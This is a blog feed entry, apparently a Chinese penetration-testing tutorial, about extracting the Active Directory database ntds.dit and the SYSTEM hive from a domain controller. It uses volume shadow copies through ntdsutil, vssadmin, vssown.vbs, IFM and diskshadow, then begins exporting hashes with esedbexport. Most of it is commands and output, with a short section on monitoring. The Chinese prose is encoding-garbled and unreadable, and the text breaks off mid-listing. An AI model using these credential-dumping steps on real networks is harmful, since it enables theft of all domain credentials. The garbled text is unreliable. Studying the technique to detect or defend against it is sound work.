    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€æµ‹è¯•-åŸŸæ§åˆ¶å™¨å®‰å…¨</title>
    <link href="https://lunamoore.github.io/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <id>https://lunamoore.github.io/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/</id>
    <published>2021-09-06T12:36:48.000Z</published>
    <updated>2021-09-06T12:38:08.077Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>åœ¨é€šå¸¸æƒ…å†µä¸‹ã€å³ä½¿æ‹¥æœ‰ç®¡ç†å‘˜æƒé™,ä¹Ÿæ— æ³•è¯»å–åŸŸæ§åˆ¶å™¨ä¸­çš„C:\Windwos\NTDS\ntds.ditæ–‡ä»¶(æ´»åŠ¨ç›®å½•å§‹ç»ˆè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æ–‡ä»¶è¢«ç¦æ­¢è¯»å–)ã€‚ä½¿ç”¨Windowsæœ¬åœ°å·å½±æ‹·è´æœåŠ¡å¯ä»¥è·å¾—æ–‡ä»¶çš„å‰¯æœ¬ã€‚</p></blockquote><h2 id="0x01-åŸŸæ§ä¸­-å·å½±æ‹·è´æœåŠ¡æå–ntds-dit"><a href="#0x01-åŸŸæ§ä¸­-å·å½±æ‹·è´æœåŠ¡æå–ntds-dit" class="headerlink" title="0x01.(åŸŸæ§ä¸­)å·å½±æ‹·è´æœåŠ¡æå–ntds.dit"></a>0x01.(åŸŸæ§ä¸­)å·å½±æ‹·è´æœåŠ¡æå–ntds.dit</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨æ´»åŠ¨ç›®å½•ä¸­,æ‰€æœ‰çš„æ•°æ®éƒ½ä¿å­˜åœ¨ ntds.ditæ–‡ä»¶ä¸­ã€‚ntds.ditæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶,å­˜å‚¨ä½ç½®ä¸ºåŸŸæ§åˆ¶å™¨çš„%SystemRoot%ntds\ntds.ditã€‚ntds.dit ä¸­åŒ…å«(ä½†ä¸é™äº)ç”¨æˆ·åã€æ•£åˆ—å€¼ã€ç»„ã€GPPã€OUç­‰ä¸æ´»åŠ¨ç›®å½•ç›¸å…³çš„ä¿¡æ¯ã€‚å®ƒå’ŒSAMæ–‡ä»¶ä¸€æ ·ï¼Œæ˜¯è¢«Windowsæ“ä½œç³»ç»Ÿé”å®šçš„ã€‚æœ¬èŠ‚å°†ä»‹ç»å¦‚ä½•ä»ç³»ç»Ÿä¸­å¯¼å‡ºntds.dit,ä»¥åŠå¦‚ä½•è¯»å–ntds.ditä¸­çš„ä¿¡æ¯ã€‚åœ¨ä¸€èˆ¬æƒ…å†µä¸‹,ç³»ç»Ÿè¿ç»´äººå‘˜ä¼šåˆ©ç”¨å·å½±æ‹·è´æœåŠ¡ï¼ˆVolume Shadow Copy Service, VSSï¼‰å®ç°è¿™äº›æ“ä½œã€‚VSSæœ¬è´¨ä¸Šå±å¿«ç…§ï¼ˆSnapshot)æŠ€æœ¯çš„ä¸€ç§ï¼Œä¸»è¦ç”¨äºå¤‡ä»½å’Œæ¢å¤ï¼ˆå³ä½¿ç›®æ ‡æ–‡ä»¶å¤„äºé”å®šçŠ¶æ€ï¼‰ã€‚</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-ä½¿ç”¨ntdsutil-exeæå–ntds-dit"><a href="#1-ä½¿ç”¨ntdsutil-exeæå–ntds-dit" class="headerlink" title="1.ä½¿ç”¨ntdsutil.exeæå–ntds.dit"></a>1.ä½¿ç”¨ntdsutil.exeæå–ntds.dit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exeæ˜¯ä¸€ä¸ªä¸ºæ´»åŠ¨ç›®å½•æä¾›ç®¡ç†æœºåˆ¶çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ä½¿ç”¨ ntdsutil.exe,å¯ä»¥ç»´æŠ¤å’Œç®¡ç†æ´»åŠ¨ç›®å½•æ•°æ®åº“ã€æ§åˆ¶å•ä¸ªä¸»æœºæ“ä½œã€åˆ›å»ºåº”ç”¨ç¨‹åºç›®å½•åˆ†åŒºã€åˆ é™¤ç”±æœªä½¿ç”¨æ´»åŠ¨ç›®å½•å®‰è£…å‘å¯¼(DCPromo.exeï¼‰æˆåŠŸé™çº§çš„åŸŸæ§åˆ¶å™¨ç•™ä¸‹çš„å…ƒæ•°æ®ç­‰ã€‚è¯¥å·¥å…·é»˜è®¤å®‰è£…åœ¨åŸŸæ§åˆ¶å™¨ä¸Šã€å¯ä»¥åœ¨åŸŸæ§åˆ¶å™¨ä¸Šç›´æ¥æ“ä½œï¼Œä¹Ÿå¯ä»¥é€šè¿‡åŸŸå†…æœºå™¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šè¿œç¨‹æ“ä½œã€‚ntdsutil.exeæ”¯æŒçš„æ“ä½œç³»ç»Ÿæœ‰ Windows Server 2003ã€ Windows Server 2008ã€ Windows Server 2012ã€‚</span><br></pre></td></tr></table></figure><p><code>é¦–å…ˆåˆ›å»ºå¿«ç…§</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><p><code>ç„¶ååŠ è½½å¿«ç…§</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;5b7236ab-c45c-43ee-b615-a7cc2149ea5c&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><code>å¤åˆ¶åˆ°cç›˜</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202109041806_VOLUMEC$\Windows\NTDS\ntds.dit C:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>å¸è½½å¿«ç…§å¹¶åˆ é™¤</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;5b7236ab-c45c-43ee-b615-a7cc2149ea5c&#125;&quot; &quot;delete &#123;5b7236ab-c45c-43ee-b615-a7cc2149ea5c&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><code>åˆ—å‡ºæ‰€æœ‰å¿«ç…§</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure><h3 id="2-ä½¿ç”¨vssadminæå–ntds-dit"><a href="#2-ä½¿ç”¨vssadminæå–ntds-dit" class="headerlink" title="2.ä½¿ç”¨vssadminæå–ntds.dit"></a>2.ä½¿ç”¨vssadminæå–ntds.dit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadminnæ˜¯ Windows Server 2008 &amp; Windows 7æä¾›çš„VSSç®¡ç†å·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºå’Œåˆ é™¤å·å½±æ‹·è´ã€åˆ—å‡ºå·å½±æ‹·è´çš„ä¿¡æ¯ï¼ˆåªèƒ½ç®¡ç†ç³»ç»Ÿ Provideråˆ›å»ºçš„å·å½±æ‹·è´)ã€æ˜¾ç¤ºå·²å®‰è£…çš„æ‰€æœ‰å·å½±æ‹·è´å†™å…¥ç¨‹åºï¼ˆwriters)å’Œæä¾›ç¨‹åºï¼ˆproviders),ä»¥åŠæ”¹å˜å·å½±æ‹·è´çš„å­˜å‚¨ç©ºé—´(å³æ‰€è°“çš„â€œdiffç©ºé—´â€)çš„å¤§å°ç­‰ã€‚vssadminn çš„æ“ä½œæµç¨‹å’Œntdsutilç±»ä¼¼</span><br></pre></td></tr></table></figure><p><code>é¦–å…ˆåˆ›å»ºä¸€ä¸ªcç›˜çš„å·å½±æ‹·è´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure><p><code>å¤åˆ¶å‡ºæ¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit c:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>åˆ é™¤å¿«ç…§</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure><p><code>åˆ—å‡ºæ‰€æœ‰å·å½±å‰¯æœ¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin List Shadows</span><br></pre></td></tr></table></figure><h3 id="3-ä½¿ç”¨vssown-vbsè„šæœ¬æå–ntds-dit"><a href="#3-ä½¿ç”¨vssown-vbsè„šæœ¬æå–ntds-dit" class="headerlink" title="3.ä½¿ç”¨vssown.vbsè„šæœ¬æå–ntds.dit"></a>3.ä½¿ç”¨vssown.vbsè„šæœ¬æå–ntds.dit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssown.vbsè„šæœ¬çš„åŠŸèƒ½å’Œvssadminç±»ä¼¼ã€‚vssown.vbs è„šæœ¬æ˜¯ç”±Tim Tomeså¼€å‘çš„ï¼Œå¯ç”¨äºåˆ›å»ºå’Œåˆ é™¤å·å½±æ‹·è´ï¼Œä»¥åŠå¯åŠ¨å’Œåœæ­¢å·å½±æ‹·è´æœåŠ¡ã€‚å¯ä»¥åœ¨å‘½ä»¤è¡Œç¯å¢ƒä¸­æ‰§è¡Œè¯¥è„šæœ¬ã€‚</span><br></pre></td></tr></table></figure><p><code>å¯åŠ¨å·å½±æ‹·è´æœåŠ¡</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start</span><br></pre></td></tr></table></figure><p><code>åˆ›å»ºä¸€ä¸ªcç›˜çš„å·å½±æ‹·è´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure><p><code>åˆ—å‡ºå·å½±æ‹·è´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure><p><code>å¤åˆ¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>åˆ é™¤å·å½±æ‹·è´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /delete &#123;17EDE50A-A1B1-48E5-B206-9FA13FED03F0&#125;</span><br></pre></td></tr></table></figure><h3 id="4-ä½¿ç”¨ntdsutilçš„iFMåˆ›å»ºå·å½±æ‹·è´"><a href="#4-ä½¿ç”¨ntdsutilçš„iFMåˆ›å»ºå·å½±æ‹·è´" class="headerlink" title="4.ä½¿ç”¨ntdsutilçš„iFMåˆ›å»ºå·å½±æ‹·è´"></a>4.ä½¿ç”¨ntdsutilçš„iFMåˆ›å»ºå·å½±æ‹·è´</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é™¤äº†æŒ‰ç…§å‰é¢ä»‹ç»çš„æ–¹æ³•é€šè¿‡æ‰§è¡Œå‘½ä»¤æ¥æå–ntds dit,ä¹Ÿå¯ä»¥ä½¿ç”¨åˆ›å»ºä¸€ä¸ª IFMçš„æ–¹å¼è·å–nsdiã€‚åœ¨ä½¿ç”¨ntdsutilåˆ›å»ºIFMæ—¶ï¼Œéœ€è¦è¿›è¡Œç”Ÿæˆå¿«ç…§ã€åŠ è½½ã€å°†ntds. ditå’Œè®¡ç®—æœºçš„SAMæ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶å¤¹ä¸­ç­‰æ“ä½œã€‚è¿™äº›æ“ä½œä¹Ÿå¯ä»¥é€šè¿‡PowerShellæˆ–WMIè¿œç¨‹æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p><code>åŸŸæ§ç®¡ç†å‘˜è¾“å…¥å¦‚ä¸‹å‘½ä»¤</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/demo&quot; quit quit</span><br><span class="line"></span><br><span class="line">C:\&gt;ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/demo&quot; quit quit</span><br><span class="line">ntdsutil: ac i ntds</span><br><span class="line">æ´»åŠ¨å®ä¾‹è®¾ç½®ä¸ºâ€œntdsâ€ã€‚</span><br><span class="line">ntdsutil: ifm</span><br><span class="line">ifm: create full c:/demo</span><br><span class="line">æ­£åœ¨åˆ›å»ºå¿«ç…§...</span><br><span class="line">æˆåŠŸç”Ÿæˆå¿«ç…§é›† &#123;65b13a1d-a952-4257-8255-46531847bb28&#125;ã€‚</span><br><span class="line">å¿«ç…§ &#123;b7140919-a826-455f-ad0d-fb548281da5c&#125; å·²ä½œä¸º C:\$SNAP_202109041835_VOLUMEC$\ è£…è½½</span><br><span class="line">å·²è£…è½½å¿«ç…§ &#123;b7140919-a826-455f-ad0d-fb548281da5c&#125;ã€‚</span><br><span class="line">æ­£åœ¨å¯åŠ¨ç¢ç‰‡æ•´ç†æ¨¡å¼...</span><br><span class="line">     æºæ•°æ®åº“: C:\$SNAP_202109041835_VOLUMEC$\Windows\NTDS\ntds.dit</span><br><span class="line">     ç›®æ ‡æ•°æ®åº“: c:\demo\Active Directory\ntds.dit</span><br><span class="line"></span><br><span class="line">                  Defragmentation  Status (omplete)</span><br><span class="line"></span><br><span class="line">          0    10   20   30   40   50   60   70   80   90  100</span><br><span class="line">          |----|----|----|----|----|----|----|----|----|----|</span><br><span class="line">          ...................................................</span><br><span class="line"></span><br><span class="line">æ­£åœ¨å¤åˆ¶æ³¨å†Œè¡¨æ–‡ä»¶...</span><br><span class="line">æ­£åœ¨å¤åˆ¶ c:\demo\registry\SYSTEM</span><br><span class="line">æ­£åœ¨å¤åˆ¶ c:\demo\registry\SECURITY</span><br><span class="line">å¿«ç…§ &#123;b7140919-a826-455f-ad0d-fb548281da5c&#125; å·²å¸è½½ã€‚</span><br><span class="line">åœ¨ c:\demo ä¸­æˆåŠŸåˆ›å»º IFM åª’ä½“ã€‚</span><br><span class="line">ifm: quit</span><br><span class="line">ntdsutil: quit</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure><p><code>åœ¨Active Directoryç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°ntds.dit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\demo\Active Directory&gt;dir</span><br><span class="line"> é©±åŠ¨å™¨ C ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚</span><br><span class="line"> å·çš„åºåˆ—å·æ˜¯ FC34-99CE</span><br><span class="line"></span><br><span class="line"> C:\demo\Active Directory çš„ç›®å½•</span><br><span class="line"></span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          .</span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          ..</span><br><span class="line">2021/09/04  18:35        25,165,824 ntds.dit</span><br><span class="line">2021/09/04  18:35            16,384 ntds.jfm</span><br><span class="line">               2 ä¸ªæ–‡ä»¶     25,182,208 å­—èŠ‚</span><br><span class="line">               2 ä¸ªç›®å½• 52,228,857,856 å¯ç”¨å­—èŠ‚</span><br><span class="line"></span><br><span class="line">C:\demo\Active Directory&gt;</span><br></pre></td></tr></table></figure><p><code>SYSTEMä¸SECURITYåœ¨registryç›®å½•ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\demo\registry&gt;dir</span><br><span class="line"> é©±åŠ¨å™¨ C ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚</span><br><span class="line"> å·çš„åºåˆ—å·æ˜¯ FC34-99CE</span><br><span class="line"></span><br><span class="line"> C:\demo\registry çš„ç›®å½•</span><br><span class="line"></span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          .</span><br><span class="line">2021/09/04  18:35    &lt;DIR&gt;          ..</span><br><span class="line">2021/07/22  14:23            65,536 SECURITY</span><br><span class="line">2021/07/22  14:23        18,087,936 SYSTEM</span><br><span class="line">               2 ä¸ªæ–‡ä»¶     18,153,472 å­—èŠ‚</span><br><span class="line">               2 ä¸ªç›®å½• 52,219,453,440 å¯ç”¨å­—èŠ‚</span><br><span class="line"></span><br><span class="line">C:\demo\registry&gt;</span><br></pre></td></tr></table></figure><p><code>åˆ é™¤</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir /s /q demo</span><br></pre></td></tr></table></figure><p><code>nishangä¸­çš„copy-vss.ps1è„šæœ¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\test&gt; Import-Module .\Copy-VSS.ps1</span><br><span class="line">PS C:\test&gt; Copy-VSS</span><br><span class="line">å·²å¤åˆ¶         1 ä¸ªæ–‡ä»¶ã€‚</span><br><span class="line">å·²å¤åˆ¶         1 ä¸ªæ–‡ä»¶ã€‚</span><br><span class="line">å·²å¤åˆ¶         1 ä¸ªæ–‡ä»¶ã€‚</span><br><span class="line">PS C:\test&gt;</span><br></pre></td></tr></table></figure><h3 id="5-ä½¿ç”¨diskshadowå¯¼å‡ºntds-dit"><a href="#5-ä½¿ç”¨diskshadowå¯¼å‡ºntds-dit" class="headerlink" title="5.ä½¿ç”¨diskshadowå¯¼å‡ºntds.dit"></a>5.ä½¿ç”¨diskshadowå¯¼å‡ºntds.dit</h3><p><code>é¦–å…ˆè¿›å…¥diskshadow</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;diskshadow</span><br></pre></td></tr></table></figure><p><code>è®¾ç½®å·å½±æ‹·è´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br></pre></td></tr></table></figure><p><code>æ·»åŠ å·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add volume c: alias someAlias</span><br></pre></td></tr></table></figure><p><code>åˆ›å»ºå¿«ç…§</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create</span><br></pre></td></tr></table></figure><p><code>åˆ†é…è™šæ‹Ÿç£ç›˜ç›˜ç¬¦</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expose %someAlias% k:</span><br></pre></td></tr></table></figure><p><code>å¤åˆ¶ntds.dit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;C:\Windows\System32\cmd.exe&quot; /c copy F:\Windows\NTDS\ntds.dit c:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>åˆ é™¤æ‰€æœ‰å¿«ç…§</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete shadows all </span><br></pre></td></tr></table></figure><p><code>åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰çš„å·å½±æ‹·è´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list shadows all</span><br></pre></td></tr></table></figure><p><code>é‡ç½®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure><p><code>é€€å‡º</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¼å‡ºntds.ditåï¼Œå¯ä»¥å°†system, hiveè½¬å‚¨ã€‚å› ä¸ºsystem.hiveä¸­å­˜æ”¾ç€ntds.ditçš„å¯†é’¥ï¼Œæ‰€ä»¥å¦‚æœæ²¡æœ‰è¯¥å¯†é’¥ï¼Œå°†æ— æ³•æŸ¥çœ‹ntds.ditä¸­çš„ä¿¡æ¯</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\windows\temp\system.hive</span><br></pre></td></tr></table></figure><h3 id="6-ç›‘æ§å·å½±æ‹·è´æœåŠ¡çš„ä½¿ç”¨æƒ…å†µ"><a href="#6-ç›‘æ§å·å½±æ‹·è´æœåŠ¡çš„ä½¿ç”¨æƒ…å†µ" class="headerlink" title="6.ç›‘æ§å·å½±æ‹·è´æœåŠ¡çš„ä½¿ç”¨æƒ…å†µ"></a>6.ç›‘æ§å·å½±æ‹·è´æœåŠ¡çš„ä½¿ç”¨æƒ…å†µ</h3><p><code>é€šè¿‡ç›‘æ§å·å½±æ‹·è´æœåŠ¡çš„ä½¿ç”¨æƒ…å†µï¼Œå¯ä»¥åŠæ—¶å‘ç°æ”»å‡»è€…åœ¨ç³»ç»Ÿä¸­è¿›è¡Œçš„ä¸€äº›æ¶æ„æ“ä½œã€‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç›‘æ§å·å½±æ‹·è´æœåŠ¡åŠä»»ä½•æ¶‰åŠæ´»åŠ¨ç›®å½•æ•°æ®åº“æ–‡ä»¶(ntds.dit)çš„å¯ç–‘æ“ä½œè¡Œä¸ºã€‚</span><br><span class="line">ç›‘æ§System Event ID 7036(å·å½±æ‹·è´æœåŠ¡è¿›äººè¿è¡ŒçŠ¶æ€çš„æ ‡å¿—)çš„å¯ç–‘å®ä¾‹ï¼Œä»¥åŠåˆ›å»ºvssvc.exeè¿›ç¨‹çš„äº‹ä»¶ã€‚</span><br><span class="line">ç›‘æ§åˆ›å»ºdkshndko.exeåŠç›¸å…³å­è¿›ç¨‹çš„äº‹ä»¶ã€‚</span><br><span class="line">ç›‘æ§å®¢æˆ·ç«¯è®¾å¤‡ä¸­çš„diskshadow.exeå®ä¾‹åˆ›å»ºäº‹ä»¶ã€‚é™¤éä¸šåŠ¡éœ€è¦ï¼Œ åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ä¸åº”è¯¥å‡ºç°diskshadow.exe.å¦‚æœå‘ç°ï¼Œåº”ç«‹åˆ»å°†å…¶åˆ é™¤ã€‚</span><br><span class="line">é€šè¿‡æ—¥å¿—ç›‘æ§æ–°å‡ºç°çš„é€»è¾‘é©±åŠ¨å™¨æ˜ å°„äº‹ä»¶ã€‚</span><br></pre></td></tr></table></figure><h2 id="0x02-å¯¼å‡ºntds-ditä¸­çš„æ•£åˆ—å€¼"><a href="#0x02-å¯¼å‡ºntds-ditä¸­çš„æ•£åˆ—å€¼" class="headerlink" title="0x02.å¯¼å‡ºntds.ditä¸­çš„æ•£åˆ—å€¼"></a>0x02.å¯¼å‡ºntds.ditä¸­çš„æ•£åˆ—å€¼</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å®éªŒç¯å¢ƒä¸ºkaliï¼Œå°†å¯¼å‡ºçš„ntds.ditæ”¾å…¥kaliä¸­è¿›è¡Œè§£æ</span><br></pre></td></tr></table></figure><h3 id="1-ä½¿ç”¨esedbexportæ¢å¤ntds-dit"><a href="#1-ä½¿ç”¨esedbexportæ¢å¤ntds-dit" class="headerlink" title="1.ä½¿ç”¨esedbexportæ¢å¤ntds.dit"></a>1.ä½¿ç”¨esedbexportæ¢å¤ntds.dit</h3><h4 id="01-å¯¼å‡ºntds-dit"><a href="#01-å¯¼å‡ºntds-dit" class="headerlink" title="01.å¯¼å‡ºntds.dit"></a>01.å¯¼å‡ºntds.dit</h4><p><code>å®‰è£…ä¾èµ–</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install autoconf automake autopoint libtool pkg-config -y</span><br></pre></td></tr></table></figure><p><code>å®‰è£…libesedb</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install </span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure><p><code>å®‰è£…æˆåŠŸä¹‹åï¼Œ/usr/local/binç›®å½•ä¸‹å°±å¯ä»¥çœ‹åˆ°esedbexport</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[/usr/local/bin]</span><br><span class="line">â””â”€# ls      </span><br><span class="line">chardetect  esedbexport  esedbinfo  nokogiri  pip  pip2  pip2.7  pip3  pip3.9  ssr  wheel</span><br></pre></td></tr></table></figure><p><code>æå–è¡¨ä¿¡æ¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure><p><code>å¯¼å‡ºè¡¨ä¿¡æ¯ï¼Œæœ¬å®éªŒåªéœ€è¦datatableå’Œlink_table</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/demo]â””â”€# lsntds.dit  ntds.dit.export                                                                                                                                    â”Œâ”€â”€(rootğŸ’€kali)-[~/demo]â””â”€# cd ntds.dit.export                                                                                                                                   â”Œâ”€â”€(rootğŸ’€kali)-[~/demo/ntds.dit.export]â””â”€# ls -l æ€»ç”¨é‡ 12772-rw-r--r-- 1 root root 12551192  9æœˆ  4 21:15 datatable.4-rw-r--r-- 1 root root      728  9æœˆ  4 21:15 hiddentable.6-rw-r--r-- 1 root root      263  9æœˆ  4 21:15 link_history_table.10-rw-r--r-- 1 root root     7612  9æœˆ  4 21:15 link_table.5-rw-r--r-- 1 root root      310  9æœˆ  4 21:15 MSysDefrag2.11-rw-r--r-- 1 root root     1342  9æœˆ  4 21:15 MSysLocales.3-rw-r--r-- 1 root root   102401  9æœˆ  4 21:15 MSysObjects.0-rw-r--r-- 1 root root   102401  9æœˆ  4 21:15 